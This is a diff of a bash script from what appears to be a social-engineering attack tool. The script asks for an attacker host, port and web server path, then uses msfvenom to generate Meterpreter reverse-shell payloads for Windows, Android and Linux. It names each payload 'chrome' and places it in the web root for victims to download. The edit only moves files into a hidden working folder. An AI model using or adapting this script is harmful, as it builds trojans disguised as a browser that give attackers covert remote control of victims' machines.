@@ -6,6 +6,8 @@ service apache2 start &> /dev/null
 service apache3 start &> /dev/null
 read -p "Enter your LHOST: " host
 echo
+read -p "Enter your full apache server path: " path
+echo
 read -p "Enter your LPORT: " port
 echo
 read -p "Enter system type (x86,x64): " types
@@ -13,17 +15,17 @@ echo
 echo "[*]Startng msfvenom"
 sleep 0.5
 echo "[*]Making Windows payload"
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port >/root/chrome.exe 
-mv /root/chrome.exe /var/www/html
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port >/root/.SEF/chrome.exe 
+mv /root/.SEF/chrome.exe $path
 echo "[*]Setting up server"
 echo
 echo "[*]Making Android payload"
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/chrome.apk 
-mv /root/chrome.apk /var/www/html
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/.SEF/chrome.apk 
+mv /root/.SEF/chrome.apk $path
 echo "[*]Setting up server"
 echo "[*]Making Linux payload"
-msfvenom -p linux/$types/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/chrome.elf
-mv /root/chrome.elf /var/www/html
+msfvenom -p linux/$types/meterpreter/reverse_tcp LHOST=$host LPORT=$port  >/root/.SEF/chrome.elf
+mv /root/.SEF/chrome.elf $path
 echo "[*]Setting up server"
 opreation=$?
 if [ $opreation == 0 ]
